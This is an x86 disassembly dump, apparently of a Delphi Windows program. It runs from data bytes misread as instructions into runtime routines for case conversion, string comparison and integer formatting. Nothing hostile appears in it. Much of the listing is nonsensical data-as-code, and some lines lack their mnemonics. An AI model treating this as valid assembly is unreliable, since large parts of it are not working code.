add [ eax + 0x34 ] bh
inc eax
add [ esp + esi + 0x40 ] ch
add [ eax ] al
add [ eax ] al
add [ eax ] al
jo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc [ eax + 0x40 ] bh
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x77 ] ah
inc eax
add [ eax ] dl
add [ eax ] al
add [ esi + esi * 2 ] cl
inc eax
add [ esp + esi + 0x40 ] ah
add [ eax + 0x34 ] dh
inc eax
add [ esp + esi + 0x40 ] dh
add [ eax + 0x34 ] bh
inc eax
add [ esp + esi + 0x40 ] ch
add [ ecx + esi + 0x31d00040 ] dh
inc eax
add [ edx + esi ] cl
add [ eax ] dl
add [ eax ] al
add [ esi + esi * 2 ] cl
inc eax
add [ esp + esi + 0x40 ] ah
add [ eax + 0x34 ] dh
inc eax
add [ esp + esi + 0x40 ] dh
add [ eax + 0x34 ] bh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
or [ edi + 0x40 ] dh
inc ebp
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x76 ] bl
inc eax
inc eax
add [ eax * 2 + 0x4f746e49 ] cl
jbe r-xdata
add [ eax ] dl
add [ eax ] al
add [ eax + 0x64004074 ] ch
xor al 0x40
add [ eax + 0x34 ] dh
inc eax
add [ esp + esi + 0x40 ] dh
add [ eax + 0x34 ] bh
inc eax
add [ esp + esi + 0x40 ] ch
add [ ecx + esi + 0x31d00040 ] dh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
dec esp
jne r-xdata
imul ebp [ edi + 0x6e ] 0x4074f490
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + edi * 2 + 0x40 ] ch
add [ esp + esi + 0x40 ] ah
add [ eax + 0x34 ] dh
inc eax
add [ esp + esi + 0x40 ] dh
add [ eax + 0x34 ] bh
inc eax
add [ esp + esi + 0x40 ] ch
add [ ecx + esi - 0x4567ffc0 ] dh
inc eax
add [ edx + esi ] cl
inc eax
add [ edi ] cl
inc ebp
dec ecx
outsb
jbe r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] dl
js r-xdata
insb
outsd
ja r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x10004077 ] bh
inc esp
imul esi [ esi + 0x69 ] 0x77606564
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] cl
ja r-xdata
outsd
jb r-xdata
add [ eax ] al
add [ esi + esi * 2 ] cl
inc eax
add [ esp + esi + 0x40 ] ah
add [ eax + 0x34 ] dh
inc eax
add [ esp + esi + 0x40 ] dh
add [ eax + 0x34 ] bh
inc eax
add [ esp + esi + 0x40 ] ch
add [ ecx + esi + 0x31d00040 ] dh
inc eax
add [ edx + esi ] cl
inc eax
add [ edx ] cl
inc ebp
dec ecx
outsb
jbe r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov al 0x76
inc eax
add [ eax ] dl
insb
outsd
ja r-xdata
mov ah 0x31
inc eax
inc eax
add [ esp + esi + 0x40 ] ah
add [ eax + 0x34 ] dh
inc eax
add [ esp + esi + 0x40 ] dh
add [ eax + 0x34 ] bh
inc eax
add [ esp + esi + 0x40 ] ch
add [ ecx + esi + 0x31d00040 ] dh
inc eax
add [ edx + esi ] cl
jae r-xdata
insb
imul esp [ eax + edx * 2 + 0x6f ] 0x65746e69
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] dl
add [ eax ] al
add al ah
jb r-xdata
inc eax
add [ esp + esi + 0x40 ] ch
add [ ecx + esi + 0x31d00040 ] dh
inc eax
add [ edx + esi ] cl
inc eax
add [ ebx ] cl
inc ebp
pop edx
jb r-xdata
add [ eax ] al
add [ esi + esi * 2 ] cl
inc eax
add [ esp + esi + 0x40 ] ah
add [ eax + 0x34 ] dh
inc eax
add [ esp + esi + 0x40 ] dh
add [ eax + 0x34 ] bh
inc eax
add [ esp + esi + 0x40 ] ch
add [ ecx + esi + 0x31d00040 ] dh
inc eax
add [ edx + esi ] cl
inc eax
add [ edx ] cl
inc ebp
push ebp
outsb
jb r-xdata
sar [ eax + 0x4077 ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov eax 0x10004077
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
insb
js r-xdata
insb
outsd
ja r-xdata
inc eax
add [ edx + esi ] cl
shl [ ecx ] 0x1
mov al 0x76
inc eax
add [ eax ] al
add [ ecx + esi + 0x31d00040 ] dh
inc eax
add [ edx + esi ] cl
inc eax
add [ eax + 0x76 ] bl
inc eax
add [ eax ] al
add [ eax ] al
outsb
lea eax [ eax ]
test [ ecx + 0x40 ] bh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jb r-xdata
add al dl
xor [ eax ] eax
or al 0x32
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx + edi * 2 ] ah
inc eax
add [ eax ] dl
add [ eax ] al
add al dh
jae r-xdata
lea eax [ eax ]
enter 0x4078 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
enter 0x4078 0x0
or al 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al cl
js r-xdata
js r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + eax ] cl
add [ eax ] al
js r-xdata
inc eax
add [ ecx ] cl
inc ebp
dec edi
jbe r-xdata
mov ah 0x31
inc eax
add al dl
xor [ eax ] eax
or al 0x32
adc [ eax + 0x40 ] bh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx + edi * 2 + 0x100040 ] al
add [ eax ] al
inc ebp
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
js r-xdata
add [ eax + eax ] cl
add [ eax ] al
add [ esp + esi + 0x40 ] ah
add [ eax + 0x34 ] dh
inc eax
add [ esp + esi + 0x40 ] dh
add [ eax + 0x34 ] bh
inc eax
add [ esp + esi + 0x40 ] ch
add [ ecx + esi + 0x31d00040 ] dh
inc eax
add [ edx + esi ] cl
inc eax
add [ eax ] dl
inc ebp
inc ecx
arpl [ ebx + 0x65 ] sp
jae r-xdata
mov ah 0x31
inc eax
add al dl
xor [ eax ] eax
or al 0x32
inc eax
add [ 0x6e6f4345 ] cl
jbe r-xdata
inc eax
add [ esp + esi + 0x40 ] ah
add [ eax + 0x34 ] dh
inc eax
add [ esp + esi + 0x40 ] dh
add [ eax + 0x34 ] bh
inc eax
add [ esp + esi + 0x40 ] ch
add [ ecx + esi + 0x31d00040 ] dh
inc eax
add [ edx + esi ] cl
inc eax
add [ eax * 2 + 0x61766e49 ] cl
insb
imul esp [ ebx + eax * 2 + 0x61 ] 0x408d7473
add al cl
js r-xdata
add al dl
xor [ eax ] eax
or al 0x32
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
test [ ecx + 0x40 ] bh
add [ eax ] dl
add [ eax ] al
add al dh
jae r-xdata
outsd
jb r-xdata
add [ eax ] al
add [ eax ] al
push esi
imul ebp [ edi + 0x6c ] 0x6f697461
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah bl
jns r-xdata
add [ esp + esi + 0x40 ] ah
add [ eax + 0x34 ] dh
inc eax
add [ esp + esi + 0x40 ] dh
add [ eax + 0x34 ] bh
inc eax
add [ esp + esi + 0x40 ] ch
add [ ecx + esi + 0x31d00040 ] dh
inc eax
shl [ ecx + edi * 2 ] 0x40
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] dl
add [ eax ] al
add al dh
jae r-xdata
add [ eax ] al
jbe r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] dl
add [ eax ] al
add al dh
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] bh
jpe r-xdata
add [ esp + esi + 0x40 ] ah
add [ eax + 0x34 ] dh
inc eax
add [ esp + esi + 0x40 ] dh
add [ eax + 0x34 ] bh
inc eax
add [ esp + esi + 0x40 ] ch
add [ ecx + esi + 0x31d00040 ] dh
inc eax
add [ edx + esi ] cl
inc eax
add [ esi ] cl
inc ebp
push ebx
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0xc00407a ] dl
add [ eax ] al
add [ eax + 0x72 ] bh
add [ esp + esi + 0x40 ] ah
add [ eax + 0x34 ] dh
inc eax
add [ esp + esi + 0x40 ] dh
add [ eax + 0x34 ] bh
inc eax
add [ esp + esi + 0x40 ] ch
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmp [ edx + 0x40 ] bh
insb
nop
fdivr [ ecx + 0x40 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx + esi + 0x31d00040 ] dh
inc eax
add [ edx + esi ] cl
inc eax
add [ ecx ] cl
inc ebp
inc ebx
outsd
outsb
je r-xdata
inc eax
shr ah 0x7a
inc eax
add [ eax ] al
add [ eax ] al
mov eax eax
nop
jpe r-xdata
arpl [ ebx + 0x4f ] bp
jbe r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah ch
jpe r-xdata
outsd
insb
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + edi * 2 + 0x40 ] cl
add [ eax + eax ] cl
add [ eax ] al
js r-xdata
add [ eax + eax ] cl
add [ eax ] al
js r-xdata
inc eax
add [ 0x72615645 ] cl
imul esp [ ecx + 0x6e ] 0x72724574
outsd
jb r-xdata
add al dl
xor [ eax ] eax
or al 0x32
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jb r-xdata
mov ah 0x31
inc eax
add al dl
xor [ eax ] eax
or al 0x32
inc eax
add [ esp + esi + 0x40 ] ah
add [ eax + 0x34 ] dh
inc eax
add [ esp + esi + 0x40 ] dh
add [ eax + 0x34 ] bh
inc eax
add [ esp + esi + 0x40 ] ch
add [ ecx + esi + 0x31d00040 ] dh
inc eax
add [ edx + esi ] cl
insb
xor al 0x40
inc eax
add [ esp + esi + 0x40 ] ah
add [ eax + 0x34 ] dh
inc eax
add [ esp + esi + 0x40 ] dh
add [ eax + 0x34 ] bh
inc eax
add [ esp + esi + 0x40 ] ch
add [ ecx + esi + 0x31d00040 ] dh
inc eax
add [ edx + esi ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
nop
jpe r-xdata
insb
outsd
ja r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc ebx
popad
jae r-xdata
outsd
jb r-xdata
arpl [ ebp + eax * 2 + 0x72 ] si
jb r-xdata
add [ eax ] al
add [ eax ] al
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + eax ] cl
add [ eax ] al
js r-xdata
inc eax
add [ edx + esi ] cl
inc eax
add [ edx ] cl
inc ebp
push eax
jb r-xdata
shl [ ecx ] 0x1
cmp [ edx + 0x40 ] bh
add [ eax ] al
add [ eax ] al
add [ ecx ] dl
add ebp [ esi ]
aaa
xor al 0x4
add [ eax ] al
add ah cl
adc [ eax ] al
dec eax
add [ eax ] al
add ah cl
adc [ eax ] al
or [ ebx + 0x79 ] dl
jae r-xdata
add [ eax + eax ] cl
add [ eax ] al
js r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
pop esp
jl r-xdata
inc ebp
jb r-xdata
inc eax
add [ esi ] cl
inc ebp
inc ecx
bound esi [ ebx + 0x74 ]
jb r-xdata
or al 0x32
add al 0x7c
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esp + edi * 2 ] al
inc eax
add [ eax ] dl
add [ eax ] al
add [ eax + 0x72 ] bh
inc eax
add [ esp + esi + 0x40 ] ah
add [ eax + 0x34 ] dh
inc eax
add [ esp + esi + 0x40 ] dh
add [ eax + 0x34 ] bh
inc eax
add [ esp + esi + 0x40 ] ch
add [ ecx + esi + 0x31d00040 ] dh
inc eax
add [ edx + esi ] cl
jb r-xdata
inc eax
add [ eax ] cl
inc ebp
dec edi
push ebx
inc ebp
jb r-xdata
mov ah 0x31
inc eax
add al dl
xor [ eax ] eax
or al 0x32
inc eax
add [ esi ] cl
inc ebp
dec ecx
outsb
je r-xdata
inc eax
add [ esp + esi + 0x40 ] ah
add [ eax + 0x34 ] dh
inc eax
add [ esp + esi + 0x40 ] dh
add [ eax + 0x34 ] bh
inc eax
add [ esp + esi + 0x40 ] ch
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
test al 0x7b
inc eax
add [ eax + eax ] cl
add [ eax ] al
js r-xdata
imul ebp [ edi + 0x6e ] 0x6c696146
lea eax [ eax ]
dec esp
jpo r-xdata
inc eax
add [ eax ] dl
inc ebp
inc ecx
mov ah 0x31
inc eax
add al dl
xor [ eax ] eax
or al 0x32
inc eax
add [ esp + esi + 0x40 ] ah
add [ eax + 0x34 ] dh
inc eax
add [ esp + esi + 0x40 ] dh
add [ eax + 0x34 ] bh
inc eax
add [ esp + esi + 0x40 ] ch
add [ ecx + esi + 0x31d00040 ] dh
inc eax
add [ edx + esi ] cl
add [ eax ] dl
jge r-xdata
je r-xdata
add [ eax ] cl
push ebx
jns r-xdata
inc eax
add [ esp + esi + 0x40 ] ah
add [ eax + 0x34 ] dh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esp + edi * 2 + 0x40 ] bl
int3
outsd
jb r-xdata
jae r-xdata
adc [ ebp + 0x41 ] al
test al 0x7b
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0xc00407b ] ch
add [ eax ] al
add [ eax + 0x72 ] bh
add al dl
xor [ eax ] eax
aam 0xe9
stosd [ edi ]
push ebp
add [ eax ] al
add eax 0xffffffd4
jmp sub_40d344
add [ eax + eax ] al
add [ eax ] cl
adc [ eax ] eax
xor al 0x40
add [ eax + 0x34 ] bh
inc eax
add [ esp + esi + 0x40 ] ch
add [ ecx + esi + 0x31d00040 ] dh
inc eax
add [ edi + ecx * 8 + 0x54130040 ] bh
xor al 0x40
insb
jae r-xdata
int3
push ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jo r-xdata
add [ ecx + esi + 0x31d00040 ] dh
inc eax
add [ edx + esi ] cl
inc eax
add [ esp + edi * 2 + 0x40 ] bl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
loopne r-xdata
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
rcr [ eax + 0x1100407c ] 0x3
cmp [ cs : esp + eax ] dh
add [ eax ] al
add ah cl
adc [ eax ] al
dec eax
add [ eax ] al
add ah cl
adc [ eax ] al
or [ ebx + 0x79 ] dl
jae r-xdata
inc ebx
outsd
jne r-xdata
insb
jae r-xdata
add [ eax ] al
add [ eax ] al
adc [ ebp + 0x40 ] bh
imul ebp [ edi + 0x6e ] 0x407c7490
imul esi [ ebp + 0x53 ] 0x68636e79
jb r-xdata
sbb [ 0x407d643f ] edi
add [ eax + eax ] ch
add [ eax ] al
add [ eax ] al
add [ eax ] al
in al dx
jge r-xdata
jb r-xdata
push esp
push 0x64616572
dec esp
outsd
arpl [ ecx + 0x6c ] sp
add al dl
xor [ eax ] eax
mov esp 0x130040cf
push esp
je r-xdata
inc eax
add [ esp + esi + 0x40 ] dh
add [ eax + 0x34 ] bh
inc eax
add [ esp + esi + 0x40 ] ch
add [ ecx + esi + 0x31d00040 ] dh
inc eax
add [ edx + esi ] cl
inc eax
add [ edx ] dl
inc ebp
push ebx
popad
arpl [ gs : ecx + 0x6c ] sp
insb
inc ebp
js r-xdata
sar bh 0xff
xor ecx ecx
outsb
imul edi [ edx + 0x65 ] r-xdata
add al dl
xor [ eax ] eax
pushad
rol [ eax ] 0x1
and al 0x54
dec ebp
jne r-xdata
add [ eax + 0x407d ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah ch
jge r-xdata
add [ eax + 0x34 ] dh
inc eax
add [ esp + esi + 0x40 ] dh
xor al 0x40
add eax 0xffffffd4
jmp sub_40d2d8
pop ebx
cmp eax [ eax ]
add al ch
inc edx
mov ebx 0x5e5fffff
je r-xdata
je r-xdata
add [ eax ] dh
add [ eax ] al
add [ edx + edx ] ch
inc eax
add [ esp + esi + 0x40 ] ah
add [ edx + ebx * 2 ] bl
inc eax
add [ eax ] ch
pop edx
inc eax
add [ eax + 0x34 ] bh
inc eax
add [ esp + esi + 0x40 ] ch
add [ eax ] bh
pop edx
inc eax
pop ebx
retn
call sub_40b9bc
call sub_4039a8
pop edi
pop esi
push edx
popad
inc ebp
js r-xdata
mov eax eax
push ebx
insb
jne r-xdata
mov edx ebx
call sub_402c30
mov eax esi
pop esi
pop ebx
retn
dec [ ebx + 0x33c68bf0 ]
leave
arpl [ eax + 0x72 ] bp
outsd
mov eax ebx
call sub_40278c
mov esi eax
mov eax esi
jns r-xdata
imul esi [ esi + 0x65 ] 0x74697257
push ebx
sub_407e14
push ebp
mov ebp esp
push ebx
mov ebx edx
mov edx eax
shr edx 0x10
div bx
mov ebx [ ebp + 0x8 ]
mov [ ecx ] ax
mov [ ebx ] dx
pop ebx
pop ebp
retn 0x4
sub_407e48
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
push esi
push edi
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b9bc
call sub_4039a8
pop edi
pop esi
pop ebx
retn
sub_407e6c
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_40278c
mov esi eax
mov eax esi
xor ecx ecx
mov edx ebx
call sub_402c30
mov eax esi
pop esi
pop ebx
retn
sub_407e8c
push ebx
mov eax [ rw-data ]
mov edx [ eax ]
mov [ rw-data ] edx
mov edx [ rw-data ]
mov ecx [ eax + 0x4 ]
mov [ edx ] ecx
mov ebx [ eax + 0x8 ]
mov edx 0xc
call sub_4027ac
call ebx
pop ebx
retn
sub_407eb8
push ebx
mov ebx eax
mov eax 0xc
call sub_40278c
mov edx [ rw-data ]
mov [ eax ] edx
mov edx [ rw-data ]
mov edx [ edx ]
mov [ eax + 0x4 ] edx
mov [ eax + 0x8 ] ebx
mov [ rw-data ] eax
mov eax [ rw-data ]
mov [ eax ] sub_407e8c
pop ebx
retn
sub_407ef0
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax esi
call sub_40422c
mov ebx eax
mov eax edi
mov edx ebx
call sub_4045b8
mov edx esi
mov esi [ edi ]
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebx
retn
mov al [ edx ]
cmp al 0x61
jb r-xdata
mov [ esi ] al
inc edx
inc esi
dec ebx
test ebx ebx
jne r-xdata
cmp al 0x7a
ja r-xdata
sub al 0x20
sub_407f2c
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax esi
call sub_40422c
mov ebx eax
mov eax edi
mov edx ebx
call sub_4045b8
mov edx esi
mov esi [ edi ]
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebx
retn
mov al [ edx ]
cmp al 0x41
jb r-xdata
mov [ esi ] al
inc edx
inc esi
dec ebx
test ebx ebx
jne r-xdata
cmp al 0x5a
ja r-xdata
add al 0x20
sub_407f68
push esi
push edi
mov esi eax
mov edi edx
or eax eax
je r-xdata
or edx edx
je r-xdata
mov eax [ eax - 0x4 ]
mov ecx eax
cmp ecx edx
jbe r-xdata
mov edx [ edx - 0x4 ]
cmp ecx ecx
[ esi ] [ edi ]
je r-xdata
mov ecx edx
sub eax edx
pop edi
pop esi
retn
movzx eax [ esi - 0x1 ]
movzx edx [ edi - 0x1 ]
sub_407f98
push esi
push edi
mov esi eax
mov edi edx
mov edx ecx
xor eax eax
and edx 0x3
sar ecx 0x2
js r-xdata
inc eax
[ esi ] [ edi ]
jne r-xdata
pop edi
pop esi
retn
mov ecx edx
[ esi ] [ edi ]
jne r-xdata
sub_407fb8
push esi
push edi
push ebx
mov esi eax
mov edi edx
or eax eax
je r-xdata
or edx edx
je r-xdata
mov eax [ eax - 0x4 ]
mov ecx eax
cmp ecx edx
jbe r-xdata
mov edx [ edx - 0x4 ]
cmp ecx ecx
mov ecx edx
sub eax edx
pop ebx
pop edi
pop esi
retn
mov bl [ esi - 0x1 ]
cmp bl 0x61
jb r-xdata
mov bh [ edi - 0x1 ]
cmp bh 0x61
jb r-xdata
cmp bl 0x7a
ja r-xdata
cmp bl bh
je r-xdata
cmp bh 0x7a
ja r-xdata
sub bl 0x20
[ esi ] [ edi ]
je r-xdata
movzx eax bl
movzx edx bh
sub bh 0x20
sub_40800c
cmp eax edx
je r-xdata
mov al 0x1
or eax eax
je r-xdata
retn
or edx edx
je r-xdata
xor eax eax
retn
mov ecx [ eax - 0x4 ]
cmp ecx [ edx - 0x4 ]
jne r-xdata
call sub_407fb8
test eax eax
jne r-xdata
sub_408030
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax esi
call sub_40422c
mov ebx eax
mov eax esi
call sub_40442c
mov edx eax
mov eax edi
mov ecx ebx
call sub_40405c
test ebx ebx
jle r-xdata
pop edi
pop esi
pop ebx
retn
push ebx
mov eax [ edi ]
push eax
call CharUpperBuffA
sub_408064
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax esi
call sub_40422c
mov ebx eax
mov eax esi
call sub_40442c
mov edx eax
mov eax edi
mov ecx ebx
call sub_40405c
test ebx ebx
jle r-xdata
pop edi
pop esi
pop ebx
retn
push ebx
mov eax [ edi ]
push eax
call CharLowerBuffA
sub_408098
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_40422c
push eax
mov eax esi
call sub_40442c
push eax
mov eax ebx
call sub_40422c
push eax
mov eax ebx
call sub_40442c
push eax
push 0x0
push 0x400
call CompareStringA
sub eax 0x2
pop esi
pop ebx
retn
sub_4080d0
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_40422c
push eax
mov eax esi
call sub_40442c
push eax
mov eax ebx
call sub_40422c
push eax
mov eax ebx
call sub_40442c
push eax
push 0x1
push 0x400
call CompareStringA
sub eax 0x2
pop esi
pop ebx
retn
sub_408120
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
push ebx
push edi
push ebx
push esi
push 0x1
push 0x400
call CompareStringA
sub eax 0x2
pop edi
pop esi
pop ebx
retn
sub_408140
push ebx
push esi
push edi
push ebp
mov ebp edx
mov edi eax
mov eax edi
call sub_40422c
mov esi eax
mov ebx 0x1
jmp r-xdata
cmp esi ebx
jl r-xdata
cmp esi ebx
jge r-xdata
cmp [ edi + ebx - 0x1 ] 0x20
jbe r-xdata
cmp [ edi + esi - 0x1 ] 0x20
jbe r-xdata
mov eax ebp
call sub_403f6c
jmp r-xdata
inc ebx
dec esi
push ebp
mov ecx esi
sub ecx ebx
inc ecx
mov edx ebx
mov eax edi
call sub_40448c
pop ebp
pop edi
pop esi
pop ebx
retn
sub_408190
push ebx
push esi
push edi
mov esi eax
xor ebx ebx
mov eax esi
call sub_40422c
test eax eax
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov al [ esi ]
add al 0xbf
sub al 0x1a
jb r-xdata
mov eax esi
call sub_40422c
sub eax 0x2
jl r-xdata
sub al 0x4
je r-xdata
mov bl 0x1
inc eax
mov edi 0x2
add al 0xfe
sub al 0x1a
jae r-xdata
inc edi
dec eax
jne r-xdata
add dl 0xf9
sub dl 0x1a
jb r-xdata
mov dl [ esi + edi - 0x1 ]
add dl 0xd0
sub dl 0xa
jb r-xdata
sub dl 0x4
je r-xdata
add dl 0xfe
sub dl 0x1a
jae r-xdata
sub_4081f4
or cl cl
jne r-xdata
push edx
push esi
or eax eax
jns sub_40820a
mov [ esi ] dl
or eax eax
jne r-xdata
add dl 0x7
neg eax
call sub_40820a
mov al 0x2d
inc ecx
dec esi
mov [ esi ] al
retn
xor edx edx
div ecx
dec esi
add dl 0x30
cmp dl 0x3a
jb r-xdata
pop ecx
pop edx
sub ecx esi
sub edx ecx
jbe r-xdata
retn
add ecx edx
mov al 0x30
sub esi edx
jmp r-xdata
dec edx
jne r-xdata
mov [ edx + esi ] al
mov [ esi ] al
sub_40820a
mov ecx 0xa
push edx
push esi
mov [ esi ] dl
or eax eax
jne r-xdata
add dl 0x7
xor edx edx
div ecx
dec esi
add dl 0x30
cmp dl 0x3a
jb r-xdata
pop ecx
pop edx
sub ecx esi
sub edx ecx
jbe r-xdata
retn
add ecx edx
mov al 0x30
sub esi edx
jmp r-xdata
dec edx
jne r-xdata
mov [ edx + esi ] al
mov [ esi ] al
sub_408240
push esi
mov esi esp
sub esp 0x10
xor ecx ecx
push edx
xor edx edx
call sub_4081f4
mov edx esi
pop eax
call sub_40405c
add esp 0x10
pop esi
retn
sub_408260
or cl cl
jne sub_408294
mov ecx 0xa
test [ eax + 0x4 ] 0x80000000
je sub_408294
push [ eax + 0x4 ]
push [ eax ]
mov eax esp
neg [ esp ]
adc [ esp + 0x4 ] 0x0
neg [ esp + 0x4 ]
call sub_408294
mov [ esi - 0x1 ] 0x2d
dec esi
inc ecx
add esp 0x8
retn
sub_408294
push esi
sub esp 0x4
fnstcw [ esp + 0x2 ]
fnstcw [ esp ]
or [ esp ] 0xf00
fldcw [ esp ]
mov [ esp ] cx
fld1
test [ eax + 0x4 ] 0x80000000
je r-xdata
fild [ eax ]
push [ eax + 0x4 ]
push [ eax ]
and [ esp + 0x4 ] 0x7fffffff
push 0x7fffffff
push 0xffffffff
fild [ esp + 0x8 ]
fild [ esp ]
fadd st2
faddp st1
add esp 0x10
jmp r-xdata
mov [ esi ] al
fld st1
fcom st3
fwait
fnstsw ax
sahf
jae r-xdata
add al 0x7
fild [ esp ]
